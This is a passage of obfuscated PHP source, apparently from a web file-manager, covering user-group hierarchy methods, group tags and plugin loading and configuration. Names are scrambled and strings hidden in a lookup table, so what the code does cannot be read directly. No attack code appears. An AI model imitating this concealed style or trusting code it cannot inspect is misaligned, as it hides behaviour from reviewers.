$”ÊñÃ = $this->field($ûÆÖ)->where($â’Ş¶Ü)->group($ôÅ˜¶ş¦[193])->select(); $üÜˆøÉ„ = array_to_keyvalue($”ÊñÃ, $ôÅ˜¶ş¦[193], $ôÅ˜¶ş¦[549]); foreach ($’«ˆ§‡ñ as &$‡Æé®œÖ) { $Ş˜üÀá = $‡Æé®œÖ[$ôÅ˜¶ş¦[1955]]; $‡Æé®œÖ[$ôÅ˜¶ş¦[2057]] = isset($üÜˆøÉ„[$Ş˜üÀá]) ? intval($üÜˆøÉ„[$Ş˜üÀá]) : !1; } unset($‡Æé®œÖ); } private function _listAppendChildrenMember(&$°¬—òû£) { $şãÍã”ì =& $_SERVER[Ñ¯©ç]; $°¤€Éšß = array_to_keyvalue($°¬—òû£, $şãÍã”ì[12], $şãÍã”ì[1955]); $¢âÔÆÌ = array($şãÍã”ì[1955] => array($şãÍã”ì[7], $°¤€Éšß)); $ƒãğİ£ = array($şãÍã”ì[1955], $şãÍã”ì[2056] => $şãÍã”ì[549]); $ŞÇ¬ô¼€ = Model($şãÍã”ì[2046])->field($ƒãğİ£)->where($¢âÔÆÌ)->group($şãÍã”ì[1955])->select(); $éßÈµ›ş = array_to_keyvalue($ŞÇ¬ô¼€, $şãÍã”ì[1955], $şãÍã”ì[549]); foreach ($°¬—òû£ as &$µïÓÕ”) { $æÊîÆÅ = $µïÓÕ”[$şãÍã”ì[1955]]; $µïÓÕ”[$şãÍã”ì[2058]] = isset($éßÈµ›ş[$æÊîÆÅ]) ? intval($éßÈµ›ş[$æÊîÆÅ]) : !1; } unset($µïÓÕ”); } private function _listAppendMeta(&$îÌˆ¦â, $ø«œò³Ä) { $ïìò²‰ö =& $_SERVER[Ñ¯©ç]; $şóìØ»‚ = array($ïìò²‰ö[1955] => array($ïìò²‰ö[7], $ø«œò³Ä)); $¹™õı³Ó = Model($ïìò²‰ö[2045])->where($şóìØ»‚)->select(); $¹™õı³Ó = array_to_keyvalue_group($¹™õı³Ó, $ïìò²‰ö[1955]); foreach ($¹™õı³Ó as &$±ŞØÈğî) { $±ŞØÈğî = array_to_keyvalue($±ŞØÈğî, $ïìò²‰ö[107], $ïìò²‰ö[434]); } unset($±ŞØÈğî); foreach ($îÌˆ¦â as &$ØÇ©É÷Ú) { $ØÇ©É÷Ú[$ïìò²‰ö[522]] = array(); if (isset($¹™õı³Ó[$ØÇ©É÷Ú[$ïìò²‰ö[1955]]])) { $ØÇ©É÷Ú[$ïìò²‰ö[522]] = $¹™õı³Ó[$ØÇ©É÷Ú[$ïìò²‰ö[1955]]]; } } unset($ØÇ©É÷Ú); } protected function parentLevelArray($Ãï¿ùÇ) { $Ä¤Ÿ¼ÃÌ =& $_SERVER[Ñ¯©ç]; $Ãï¿ùÇ = explode($Ä¤Ÿ¼ÃÌ[50], trim($Ãï¿ùÇ, $Ä¤Ÿ¼ÃÌ[50])); $Ãï¿ùÇ = array_remove_value($Ãï¿ùÇ, $Ä¤Ÿ¼ÃÌ[229]); return $Ãï¿ùÇ; } protected function parentInGroup($À­¨Ä®», $ÖÈ¾–¬«) { $çà“ ®ç =& $_SERVER[Ñ¯©ç]; $ß¤àşóÜ = $this->getInfoSimple($À­¨Ä®»); if (!$ß¤àşóÜ) { return !0; } $ö‚Œ”¼Ô = $this->parentLevelArray($ß¤àşóÜ[$çà“ ®ç[568]]); $ö‚Œ”¼Ô[] = $À­¨Ä®»; foreach ($ö‚Œ”¼Ô as $À­¨Ä®») { if (in_array($À­¨Ä®» . $çà“ ®ç[12], $ÖÈ¾–¬«)) { return !0; } } return !1; } private function _listAppendParent(&$ƒæŸ ê) { $ÙÈ»Åå =& $_SERVER[Ñ¯©ç]; $è½ı¢Œ = array(); foreach ($ƒæŸ ê as &$¿Ïá•…ê) { $è½ı¢Œ[$¿Ïá•…ê[$ÙÈ»Åå[1955]]] = $¿Ïá•…ê[$ÙÈ»Åå[32]]; $¶“©€¾ä = $this->parentLevelArray($¿Ïá•…ê[$ÙÈ»Åå[568]]); foreach ($¶“©€¾ä as $üÄÚŸà) { if (!isset($è½ı¢Œ[$üÄÚŸà])) { $è½ı¢Œ[$üÄÚŸà] = 0; } } } unset($¿Ïá•…ê); foreach ($è½ı¢Œ as $ÄßŸÊ°„ => $‘é¤ëì¥) { if ($‘é¤ëì¥) { continue; } $‘àøªÊş = $this->getInfoSimple($ÄßŸÊ°„); $è½ı¢Œ[$ÄßŸÊ°„] = $‘àøªÊş[$ÙÈ»Åå[32]]; } $ªõÈâÆö = $GLOBALS[$ÙÈ»Åå[6]][$ÙÈ»Åå[102]][$ÙÈ»Åå[2059]]; if (KodUser::isRoot()) { $ªõÈâÆö = !1; } foreach ($ƒæŸ ê as &$¿Ïá•…ê) { $¶“©€¾ä = $this->parentLevelArray($¿Ïá•…ê[$ÙÈ»Åå[568]]); $œä¢ÇĞÑ = $ÙÈ»Åå[12]; foreach ($¶“©€¾ä as $ÄßŸÊ°„ => $üÄÚŸà) { if ($ªõÈâÆö && $ÄßŸÊ°„ == 0) { continue; } $œä¢ÇĞÑ .= $è½ı¢Œ[$üÄÚŸà] . $ÙÈ»Åå[8]; } if ($¶“©€¾ä) { $œä¢ÇĞÑ .= $¿Ïá•…ê[$ÙÈ»Åå[32]]; } $¿Ïá•…ê[$ÙÈ»Åå[573]] = str_replace($ÙÈ»Åå[576], $ÙÈ»Åå[8], $œä¢ÇĞÑ); } unset($¿Ïá•…ê); } private function _listAppendSourceRoot(&$®ŒêĞä¯, $è¸ı›Ã) { $ëÌ‹Å½Ê =& $_SERVER[Ñ¯©ç]; $íşú…ò = Model($ëÌ‹Å½Ê[877])->listSourceRoot(SourceModel::TYPE_GROUP, $è¸ı›Ã); $íşú…ò = array_to_keyvalue($íşú…ò, $ëÌ‹Å½Ê[553]); $íşú…ò = array_remove_key($íşú…ò, $ëÌ‹Å½Ê[553]); foreach ($®ŒêĞä¯ as &$ÌÔ±¬ã£) { $ÌÔ±¬ã£[$ëÌ‹Å½Ê[100]] = $íşú…ò[$ÌÔ±¬ã£[$ëÌ‹Å½Ê[1955]]] ? $íşú…ò[$ÌÔ±¬ã£[$ëÌ‹Å½Ê[1955]]] : array(); } unset($ÌÔ±¬ã£); } protected function groupMerge($›üíæãö) { $›üíæãö = array_values(array_unique($›üíæãö)); $¤©â£äó = array(); for ($§Èİ¿ = 0; $§Èİ¿ < count($›üíæãö); $§Èİ¿++) { $ä³½ÂÅ÷ = !1; for ($œ—¢—é = 0; $œ—¢—é < count($›üíæãö); $œ—¢—é++) { if ($§Èİ¿ == $œ—¢—é) { continue; } if ($this->isParentOf($›üíæãö[$œ—¢—é], $›üíæãö[$§Èİ¿])) { $ä³½ÂÅ÷ = !0; break; } } if (!$ä³½ÂÅ÷) { $¤©â£äó[] = $›üíæãö[$§Èİ¿]; } } return $¤©â£äó; } protected function isParentOf($Óùƒ‡¼, $çÓøÍ¹”) { $áòÔ¸‚ =& $_SERVER[Ñ¯©ç]; if (!$Óùƒ‡¼ || !$çÓøÍ¹” || $Óùƒ‡¼ == $çÓøÍ¹”) { return !1; } $¸ôöÖá = $this->getInfoSimple($Óùƒ‡¼); $ÙäË³Ë = $this->getInfoSimple($çÓøÍ¹”); $¨àÓ’íø = $¸ôöÖá[$áòÔ¸‚[568]] . $Óùƒ‡¼ . $áòÔ¸‚[50]; if (substr($ÙäË³Ë[$áòÔ¸‚[568]], 0, strlen($¨àÓ’íø)) == $¨àÓ’íø) { return !0; } return !1; } public function groupShowRoot($ù‹ Ò¯, $·¬™àñˆ = false) { $ËÓ±ËİÂ =& $_SERVER[Ñ¯©ç]; $áèòÚçõ = $this->getInfo($ù‹ Ò¯); if (!$áèòÚçõ) { return array(); } $€¡®öÛí = $this->parentLevelArray($áèòÚçõ[$ËÓ±ËİÂ[568]]); $´Š´¥Ë¾ = array($ù‹ Ò¯); if (count($€¡®öÛí) == 0) { return $´Š´¥Ë¾; } if ($·¬™àñˆ && count($€¡®öÛí) == 1) { return $´Š´¥Ë¾; } if (!$áèòÚçõ[$ËÓ±ËİÂ[522]] || !isset($áèòÚçõ[$ËÓ±ËİÂ[522]][$ËÓ±ËİÂ[2042]]) || $áèòÚçõ[$ËÓ±ËİÂ[522]][$ËÓ±ËİÂ[2042]] == $ËÓ±ËİÂ[2011]) { return $this->groupShowRoot($€¡®öÛí[count($€¡®öÛí) - 1], $·¬™àñˆ); } if ($áèòÚçõ[$ËÓ±ËİÂ[522]][$ËÓ±ËİÂ[2042]] == $ËÓ±ËİÂ[417]) { $†¾¸ÓÅú = explode($ËÓ±ËİÂ[50], $áèòÚçõ[$ËÓ±ËİÂ[522]][$ËÓ±ËİÂ[2043]]); if ($†¾¸ÓÅú) { $´Š´¥Ë¾ = array_merge($´Š´¥Ë¾, $†¾¸ÓÅú); } } return $´Š´¥Ë¾; } protected function resetParentLevel() { $æ–½ê¥• =& $_SERVER[Ñ¯©ç]; $ŒĞÀ±—ú = $æ–½ê¥•[1955]; $Ìš©ôä÷ = $this->select(); $Ìš©ôä÷ = array_to_keyvalue($Ìš©ôä÷, $ŒĞÀ±—ú); foreach ($Ìš©ôä÷ as $¨§ÅŞŞ) { $²»¸„µê = $¨§ÅŞŞ; $»ù³Óá­ = array(); while ($²»¸„µê[$æ–½ê¥•[193]] != 0) { $»ù³Óá­[] = $²»¸„µê[$æ–½ê¥•[193]]; $²»¸„µê = $Ìš©ôä÷[$²»¸„µê[$æ–½ê¥•[193]]]; } $»ù³Óá­[] = 0; $»ù³Óá­ = $æ–½ê¥•[50] . implode($æ–½ê¥•[50], array_reverse($»ù³Óá­)) . $æ–½ê¥•[50]; $this->setNamePinyin($¨§ÅŞŞ[$ŒĞÀ±—ú], $¨§ÅŞŞ[$æ–½ê¥•[32]]); $this->where(array($ŒĞÀ±—ú => $¨§ÅŞŞ[$ŒĞÀ±—ú]))->save(array($æ–½ê¥•[635] => $»ù³Óá­)); } return $Ìš©ôä÷; } public function groupNameAuto($é§ŞÓ’, $«Á¤§áØ) { $„«—ú»¸ =& $_SERVER[Ñ¯©ç]; $©—§©Ì = $this->where(array($„«—ú»¸[460] => $é§ŞÓ’))->getField($„«—ú»¸[32], !0); if (!$©—§©Ì || !in_array($«Á¤§áØ, $©—§©Ì)) { return $«Á¤§áØ; } for ($ôİÔ¯ æ = 1; $ôİÔ¯ æ <= count($©—§©Ì) + 1; $ôİÔ¯ æ++) { $’Œè„ğ‘ = $«Á¤§áØ . "\x28{$ôİÔ¯ æ}\x29"; if (!in_array($’Œè„ğ‘, $©—§©Ì)) { return $’Œè„ğ‘; } } } public function groupSwitch($¿ÛƒáÆ², $†Œã»Îò) { $†£îÕªŠ =& $_SERVER[Ñ¯©ç]; $¢ÚÙ³úæ = array($†£îÕªŠ[1955] => array($†£îÕªŠ[7], array($¿ÛƒáÆ², $†Œã»Îò))); $‘úîšÇ = $this->where($¢ÚÙ³úæ)->select(); $‘úîšÇ = array_to_keyvalue($‘úîšÇ, $†£îÕªŠ[1955]); if (!isset($‘úîšÇ[$¿ÛƒáÆ²]) || !isset($‘úîšÇ[$†Œã»Îò]) || $‘úîšÇ[$¿ÛƒáÆ²][$†£îÕªŠ[193]] == 0) { return !1; } $¢ÚÙ³úæ = array($†£îÕªŠ[1955] => $¿ÛƒáÆ²); $ÑôËÖÍ = Model($†£îÕªŠ[2046])->where($¢ÚÙ³úæ)->select(); if (!$ÑôËÖÍ) { $ÑôËÖÍ = array(); } foreach ($ÑôËÖÍ as $œÑß˜ãš) { $ˆœš·×† = $œÑß˜ãš[$†£îÕªŠ[1757]]; $¢ÚÙ³úæ = array($†£îÕªŠ[1757] => $ˆœš·×†, $†£îÕªŠ[1955] => $†Œã»Îò); $¶‡ÈÁÏ = Model($†£îÕªŠ[2046])->where($¢ÚÙ³úæ)->find(); if (!$¶‡ÈÁÏ) { $µô¡¤ıï = array($†Œã»Îò => $œÑß˜ãš[$†£îÕªŠ[2060]]); Model($†£îÕªŠ[582])->userGroupAdd($ˆœš·×†, $µô¡¤ıï); } Model($†£îÕªŠ[582])->userGroupRemove($ˆœš·×†, $¿ÛƒáÆ²); } $¢ÚÙ³úæ = array($†£îÕªŠ[191] => 2, $†£îÕªŠ[193] => 0, $†£îÕªŠ[468] => 1, $†£îÕªŠ[553] => array($†£îÕªŠ[7], array($¿ÛƒáÆ², $†Œã»Îò))); $ÉÂ—®™ = Model($†£îÕªŠ[877])->where($¢ÚÙ³úæ)->field($†£îÕªŠ[2061])->select(); $ÉÂ—®™ = array_to_keyvalue($ÉÂ—®™, $†£îÕªŠ[553], $†£îÕªŠ[194]); $úßÄşŒ = !empty($ÉÂ—®™[$¿ÛƒáÆ²]) ? $ÉÂ—®™[$¿ÛƒáÆ²] : !1; if ($úßÄşŒ) { if (!$ÉÂ—®™[$†Œã»Îò]) { $ÉÂ—®™[$†Œã»Îò] = Model($†£îÕªŠ[877])->groupRootAdd($†Œã»Îò); } $šËıŒ¦ê = $ÉÂ—®™[$†Œã»Îò]; $¢ÚÙ³úæ = array($†£îÕªŠ[193] => $úßÄşŒ); $ÉÂ—®™ = Model($†£îÕªŠ[877])->where($¢ÚÙ³úæ)->field($†£îÕªŠ[2062])->select(); if (!$ÉÂ—®™) { $ÉÂ—®™ = array(); } Model($†£îÕªŠ[877])->moveClearAuth = !1; foreach ($ÉÂ—®™ as $³¡„±Üƒ) { $ò–£ªú– = $³¡„±Üƒ[$†£îÕªŠ[468]] == $†£îÕªŠ[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($†£îÕªŠ[877])->move($³¡„±Üƒ[$†£îÕªŠ[194]], $šËıŒ¦ê, $ò–£ªú–); } Model($†£îÕªŠ[877])->moveClearAuth = !0; $¢ÚÙ³úæ = array($†£îÕªŠ[191] => 2, $†£îÕªŠ[553] => $¿ÛƒáÆ²); $¢û»Åâš = array($†£îÕªŠ[553] => $†Œã»Îò); Model($†£îÕªŠ[2063])->where($¢ÚÙ³úæ)->save($¢û»Åâš); Model($†£îÕªŠ[2064])->where($¢ÚÙ³úæ)->save($¢û»Åâš); } $this->_changeChildLevel($‘úîšÇ[$¿ÛƒáÆ²], $‘úîšÇ[$†Œã»Îò], !0); $this->where(array($†£îÕªŠ[193] => $¿ÛƒáÆ²))->save(array($†£îÕªŠ[193] => $†Œã»Îò)); $this->_clearChildrenCache($‘úîšÇ[$†Œã»Îò]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($Â•‰šÑŸ) { $†Ş‡ã‚û =& $_SERVER[Ñ¯©ç]; return array($†Ş‡ã‚û[2065] => array($Â•‰šÑŸ[0], $†Ş‡ã‚û[2066]), $†Ş‡ã‚û[2067] => array($Â•‰šÑŸ[0], $†Ş‡ã‚û[2068])); } protected function get($î³ŸöÀ) { $åÅ¤ÔÁ =& $_SERVER[Ñ¯©ç]; $÷’ñöáÎ = Model($åÅ¤ÔÁ[569])->metaGet($î³ŸöÀ, $åÅ¤ÔÁ[2069]); $†ƒâ…óµ = json_decode($÷’ñöáÎ, !0); return $†ƒâ…óµ ? $†ƒâ…óµ : array($åÅ¤ÔÁ[2070] => $åÅ¤ÔÁ[101], $åÅ¤ÔÁ[429] => array()); } protected function set($ú·ßÇª, $‡ïü§ç¸) { $ô¡é¢Æú =& $_SERVER[Ñ¯©ç]; $‡ïü§ç¸ = $‡ïü§ç¸ ? $‡ïü§ç¸ : array($ô¡é¢Æú[2070] => $ô¡é¢Æú[101], $ô¡é¢Æú[429] => array()); return Model($ô¡é¢Æú[569])->metaSet($ú·ßÇª, $ô¡é¢Æú[2069], json_encode($‡ïü§ç¸)); } protected function getByTagID($üˆ†Óè, $÷ç—«ù¡) { $à˜’ÄÙª =& $_SERVER[Ñ¯©ç]; if (!$üˆ†Óè || !$÷ç—«ù¡) { return !1; } if (!Model($à˜’ÄÙª[569])->getInfoSimple($üˆ†Óè)) { return !1; } $õ…„ô›ı = $this->get($üˆ†Óè); if (!$õ…„ô›ı || !isset($õ…„ô›ı[$à˜’ÄÙª[429]])) { return !1; } $³é­Â”Ó = array_find_by_field($õ…„ô›ı[$à˜’ÄÙª[429]], $à˜’ÄÙª[458], $÷ç—«ù¡); return is_array($³é­Â”Ó) ? $³é­Â”Ó : !1; } public function listSource($µ›”·‡ñ, $Ø¨¦ÅÓÜ) { $üÆ¡ÏóĞ =& $_SERVER[Ñ¯©ç]; if ($Ø¨¦ÅÓÜ && !is_array($Ø¨¦ÅÓÜ)) { $Ø¨¦ÅÓÜ = array($Ø¨¦ÅÓÜ); } $îŞ°ê•ï = $this->listData($µ›”·‡ñ); $à‡‹”½Å = array(); foreach ($îŞ°ê•ï as $­É‹¨¬Ñ) { $Êş²Ş„Ï = $­É‹¨¬Ñ[$üÆ¡ÏóĞ[97]]; if (!$Êş²Ş„Ï) { continue; } if (!isset($à‡‹”½Å[$Êş²Ş„Ï])) { $à‡‹”½Å[$Êş²Ş„Ï] = array(); } $à‡‹”½Å[$Êş²Ş„Ï][] = $­É‹¨¬Ñ[$üÆ¡ÏóĞ[483]]; } $ï¦·¤›â = array(); foreach ($à‡‹”½Å as $ğéÂ¨ë” => $­Æéöç) { $È˜è‹²Ş = !0; if (!$Ø¨¦ÅÓÜ) { $ï¦·¤›â[] = $ğéÂ¨ë”; continue; } foreach ($Ø¨¦ÅÓÜ as $ˆŠÖ±Ìš) { if (!in_array($ˆŠÖ±Ìš, $­Æéöç)) { $È˜è‹²Ş = !1; break; } } if ($È˜è‹²Ş) { $ï¦·¤›â[] = $ğéÂ¨ë”; } } if (!$ï¦·¤›â) { return array(); } $ÍÜÆëŞ = array($üÆ¡ÏóĞ[474] => array($üÆ¡ÏóĞ[475], $ï¦·¤›â), $üÆ¡ÏóĞ[553] => $µ›”·‡ñ, $üÆ¡ÏóĞ[191] => SourceModel::TYPE_GROUP); $×¤½ëÕ× = Model($üÆ¡ÏóĞ[1391])->listSource($ÍÜÆëŞ); if (!$×¤½ëÕ× || count($ï¦·¤›â) == $×¤½ëÕ×[$üÆ¡ÏóĞ[426]][$üÆ¡ÏóĞ[427]]) { return $×¤½ëÕ×; } $»¬‘ÓÕ¨ = array(); $ÆøÑ˜ØÚ = array_to_keyvalue($×¤½ëÕ×[$üÆ¡ÏóĞ[95]], $üÆ¡ÏóĞ[12], $üÆ¡ÏóĞ[194]); $æ‹Ñ§‰„ = array_to_keyvalue($×¤½ëÕ×[$üÆ¡ÏóĞ[96]], $üÆ¡ÏóĞ[12], $üÆ¡ÏóĞ[194]); $”³ó¯¡ = array_merge($æ‹Ñ§‰„, $ÆøÑ˜ØÚ); foreach ($ï¦·¤›â as $Êş²Ş„Ï) { if (!in_array($Êş²Ş„Ï, $”³ó¯¡)) { $»¬‘ÓÕ¨[] = $Êş²Ş„Ï; } } if ($»¬‘ÓÕ¨) { $this->removeBySource($µ›”·‡ñ, $»¬‘ÓÕ¨); } return $×¤½ëÕ×; } protected function listData($éÓÇ¯¶³) { $İ¡¦ùíÉ =& $_SERVER[Ñ¯©ç]; $„ãğùƒ¢ = array($İ¡¦ùíÉ[1748] => 0, $İ¡¦ùíÉ[541] => array($İ¡¦ùíÉ[2071], 0), $İ¡¦ùíÉ[479] => $İ¡¦ùíÉ[2072] . $éÓÇ¯¶³); $ø×Ò“Û™ = $İ¡¦ùíÉ[2073]; $Š”ŒÏ¸  = $this->field($ø×Ò“Û™)->where($„ãğùƒ¢)->order($İ¡¦ùíÉ[2074])->select(); return $Š”ŒÏ¸  ? $Š”ŒÏ¸  : array(); } protected function addToTag($¿ñİ£—¯, $õÑá±§Ê, $¥²âŸÙ”) { $²—£·Å =& $_SERVER[Ñ¯©ç]; if (!$this->getByTagID($¿ñİ£—¯, $¥²âŸÙ”) || !$õÑá±§Ê) { return !1; } if (!Model($²—£·Å[877])->pathInfo($õÑá±§Ê)) { return !1; } $¿í¾ó«ú = array($²—£·Å[1748] => 0, $²—£·Å[541] => $¥²âŸÙ”, $²—£·Å[478] => $õÑá±§Ê, $²—£·Å[479] => $²—£·Å[2075] . $¿ñİ£—¯, $²—£·Å[477] => $²—£·Å[12], $²—£·Å[1959] => 0); if ($this->where($¿í¾ó«ú)->find()) { return !1; } return $this->add($¿í¾ó«ú); } protected function removeFromTag($´¬ÒñÍ, $âã¦Ÿ÷, $Ãã¦Û¶Û) { $¶û™¦€¤ =& $_SERVER[Ñ¯©ç]; if (!$this->getByTagID($´¬ÒñÍ, $Ãã¦Û¶Û) || !$âã¦Ÿ÷) { return !1; } if (is_array($âã¦Ÿ÷)) { $âã¦Ÿ÷ = array($¶û™¦€¤[7], $âã¦Ÿ÷); } $˜„¢Š¯ì = array($¶û™¦€¤[1748] => 0, $¶û™¦€¤[541] => $Ãã¦Û¶Û, $¶û™¦€¤[479] => $¶û™¦€¤[2075] . $´¬ÒñÍ, $¶û™¦€¤[478] => $âã¦Ÿ÷); return $this->where($˜„¢Š¯ì)->delete(); } protected function removeByTag($Ç—ğµ¸Ü, $—Ä¢Ï) { $¨¶“òûÕ =& $_SERVER[Ñ¯©ç]; if (!$this->getByTagID($Ç—ğµ¸Ü, $—Ä¢Ï)) { return !1; } $Ó·‚Ñã® = array($¨¶“òûÕ[1748] => 0, $¨¶“òûÕ[541] => $—Ä¢Ï, $¨¶“òûÕ[479] => $¨¶“òûÕ[2075] . $Ç—ğµ¸Ü); return $this->where($Ó·‚Ñã®)->delete(); } protected function removeBySource($§­ Ï, $‰Ğ×¥ó×) { $ÊóŒõ›Ğ =& $_SERVER[Ñ¯©ç]; if (!$§­ Ï || !$‰Ğ×¥ó×) { return !1; } if (is_array($‰Ğ×¥ó×)) { $‰Ğ×¥ó× = array($ÊóŒõ›Ğ[7], $‰Ğ×¥ó×); } $ßõáûÓ  = array($ÊóŒõ›Ğ[1748] => 0, $ÊóŒõ›Ğ[478] => $‰Ğ×¥ó×, $ÊóŒõ›Ğ[541] => array($ÊóŒõ›Ğ[1067], 0), $ÊóŒõ›Ğ[479] => $ÊóŒõ›Ğ[2075] . $§­ Ï); return $this->where($ßõáûÓ )->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x70\154\x75\x67\x69\x6e\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\163\x74\x61\164\165\163", "\x72\145\147\151\145\x73\x74", "\x63\157\x6e\x66\x69\x67"); public function loadList($‘Š·Ğåé = false) { $˜–óœßü = array_to_keyvalue($this->listData(), $_SERVER[Ñ¯©ç][32]); if ($‘Š·Ğåé) { return $˜–óœßü[$‘Š·Ğåé]; } return $˜–óœßü; } public function init() { $„‹è¼¼î =& $_SERVER[Ñ¯©ç]; Hook::trigger($„‹è¼¼î[2076]); $ã¶•×™ì = $this->loadPluginList(); foreach ($ã¶•×™ì as $ãµÓºÙ‹ => $¤¼˜êä¼) { $ Ç±š±æ = $this->appAllow($ãµÓºÙ‹, $¤¼˜êä¼); if (!$ Ç±š±æ) { continue; } foreach ($¤¼˜êä¼[$„‹è¼¼î[2077]] as $ãù¸ÍĞÀ => $•ø×Ä‹´) { Hook::bind($ãù¸ÍĞÀ, $•ø×Ä‹´); } } Hook::trigger($„‹è¼¼î[2078]); Hook::trigger(ACTION); } public function appAllow($ªå…¤Ş·, $¾Ê™îâ®, $Óç…Ä = true) { $Ë®’Ùô =& $_SERVER[Ñ¯©ç]; $ÛØ¬À = PLUGIN_DIR . $ªå…¤Ş· . $Ë®’Ùô[2079]; if (!is_array($¾Ê™îâ®) || !is_array($¾Ê™îâ®[$Ë®’Ùô[2077]]) || $¾Ê™îâ®[$Ë®’Ùô[803]] != 1 || !is_file($ÛØ¬À)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ë®’Ùô[6]][$Ë®’Ùô[2080]] || !$GLOBALS[$Ë®’Ùô[6]][$Ë®’Ùô[2081]]) { return !0; } $ñÖã›ÛÅ = explode($Ë®’Ùô[50], strtolower($GLOBALS[$Ë®’Ùô[6]][$Ë®’Ùô[2081]])); return in_array(strtolower($ªå…¤Ş·), $ñÖã›ÛÅ) ? !1 : !0; } if ($Óç…Ä && !Action($Ë®’Ùô[2082])->checkAuth($ªå…¤Ş·)) { return !1; } return !0; } public function unInstall($Ô½İšû´) { $™áÁî„Ó =& $_SERVER[Ñ¯©ç]; $€óºûşë = $this->loadList($Ô½İšû´); if (file_exists(PLUGIN_DIR . $Ô½İšû´)) { Hook::apply($Ô½İšû´ . $™áÁî„Ó[2083]); } $this->remove($€óºûşë[$™áÁî„Ó[458]]); } public function changeStatus($²Êƒ‰’, $ââ÷†ÛË) { $ğ¾££ç =& $_SERVER[Ñ¯©ç]; $Ñ›åü­ı = $this->loadList($²Êƒ‰’); if ($ââ÷†ÛË) { Hook::apply($²Êƒ‰’ . $ğ¾££ç[2084]); } $this->update($Ñ›åü­ı[$ğ¾££ç[458]], array($ğ¾££ç[2085] => $ââ÷†ÛË)); } public function appRegist($Ş³ ¢¸, $Î¹òÂï†) { $Ş‚·ó¸¨ =& $_SERVER[Ñ¯©ç]; $•Àş®Öß = $this->loadList($Ş³ ¢¸); if ($•Àş®Öß) { $this->update($•Àş®Öß[$Ş‚·ó¸¨[458]], array($Ş‚·ó¸¨[2077] => $Î¹òÂï†)); } else { $´ÀÔ = array($Ş‚·ó¸¨[32] => $Ş³ ¢¸, $Ş‚·ó¸¨[2077] => $Î¹òÂï†, $Ş‚·ó¸¨[803] => 0, $Ş‚·ó¸¨[6] => $this->getConfigDefault($Ş³ ¢¸)); $this->insert($´ÀÔ); } } public function getConfigDefault($·­ç) { $áíÇ‡Ó¢ =& $_SERVER[Ñ¯©ç]; $óÊÆºËŸ = array(); $ì»¹æì = $this->getPackageJson($·­ç); if (!$ì»¹æì && is_array($ì»¹æì[$áíÇ‡Ó¢[2086]])) { return $óÊÆºËŸ; } foreach ($ì»¹æì[$áíÇ‡Ó¢[2086]] as $ËØÇÍîş => $éåü±Ìœ) { if (!isset($éåü±Ìœ[$áíÇ‡Ó¢[434]]) || isset($óÊÆºËŸ[$ËØÇÍîş])) { continue; } $óÊÆºËŸ[$ËØÇÍîş] = $éåü±Ìœ[$áíÇ‡Ó¢[434]]; } return $óÊÆºËŸ; } public function getPackageJson($Ä”û¡ôƒ) { return Hook::apply($Ä”û¡ôƒ . $_SERVER[Ñ¯©ç][2087]); } public function getConfig($à‰€èÜğ, $ŸÌÊ…°è = false) { $¸¬…¿áÏ =& $_SERVER[Ñ¯©ç]; $¥óıè³¢ = array(); $ìçŸüê = $this->loadList($à‰€èÜğ); if ($ìçŸüê && is_array($ìçŸüê[$¸¬…¿áÏ[6]])) { $¥óıè³¢ = $ìçŸüê[$¸¬…¿áÏ[6]]; } if (!$¥óıè³¢ || $ŸÌÊ…°è) { $¥óıè³¢ = $this->getConfigDefault($à‰€èÜğ); } return $¥óıè³¢; } public function setConfig($×ŸÌƒ¤Ü, $Å’üÛÇ¯ = false) { $ÌâÔÉŠ =& $_SERVER[Ñ¯©ç]; $‚±£“™§ = $this->loadList($×ŸÌƒ¤Ü); if (!$‚±£“™§) { return !1; } $š´Š°…ƒ = $‚±£“™§[$ÌâÔÉŠ[6]]; if ($Å’üÛÇ¯ == !1) { $š´Š°…ƒ = array(); $Å’üÛÇ¯ = $this->getConfigDefault($×ŸÌƒ¤Ü); } foreach ($Å’üÛÇ¯ as $äüŠóì => $èóä®Ä) { $š´Š°…ƒ[$äüŠóì] = is_string($èóä®Ä) ? trim($èóä®Ä) : $èóä®Ä; } $this->update($‚±£“™§[$ÌâÔÉŠ[458]], array($ÌâÔÉŠ[6] => $š´Š°…ƒ)); } public function viewList() { $«ƒåóü =& $_SERVER[Ñ¯©ç]; $´áèÅ¡ = $this->loadList(); $this->pluginScan($´áèÅ¡); $´áèÅ¡ = $this->loadPluginList(); $¦Õ–òŒ¶ = array(); foreach ($´áèÅ¡ as $Ğ«şÈ¶ => $Ÿ›èè›) { $»Öêø¿Ã = $Ÿ›èè›; unset($Ÿ›èè›[$«ƒåóü[2077]], $Ÿ›èè›[$«ƒåóü[6]]); $‰Èöš¼¯ = PLUGIN_DIR . $Ÿ›èè›[$«ƒåóü[32]] . $«ƒåóü[2079]; if (!is_file($‰Èöš¼¯)) { continue; } $ “‘œ‰ = Hook::apply($Ÿ›èè›[$«ƒåóü[32]] . $«ƒåóü[2087]); if (!is_array($ “‘œ‰)) { continue; } $¦Õ–òŒ¶[$Ğ«şÈ¶] = array_merge($Ÿ›èè›, $ “‘œ‰); if ($»Öêø¿Ã[$«ƒåóü[6]][$«ƒåóü[1672]] != $ “‘œ‰[$«ƒåóü[1646]]) { Hook::apply($Ÿ›èè›[$«ƒåóü[32]] . $«ƒåóü[2084]); $»Öêø¿Ã[$«ƒåóü[6]][$«ƒåóü[1672]] = $ “‘œ‰[$«ƒåóü[1646]]; $this->update($Ÿ›èè›[$«ƒåóü[458]], array($«ƒåóü[6] => $»Öêø¿Ã[$«ƒåóü[6]])); } } return $¦Õ–òŒ¶; } private function loadPluginList() { $ÅŞªí¿È =& $_SERVER[Ñ¯©ç]; $¢Æı³Î = $this->loadList(); if (strtolower(MOD) == $ÅŞªí¿È[2088]) { return $¢Æı³Î; } $ÛëìÃùÌ = Hook::trigger($ÅŞªí¿È[2089], $¢Æı³Î); if ($¢Æı³Î && !$ÛëìÃùÌ) { die; } return $ÛëìÃùÌ ? $ÛëìÃùÌ : $¢Æı³Î; } private function pluginScan($¤’æ•Ú¥) { $²ìòåÔ =& $_SERVER[Ñ¯©ç]; recursion_dir(PLUGIN_DIR, $Œä³ˆ¹Š, $¨€Ó°Æ¸, 0); foreach ($Œä³ˆ¹Š as $Å¸‡“Ìø) { 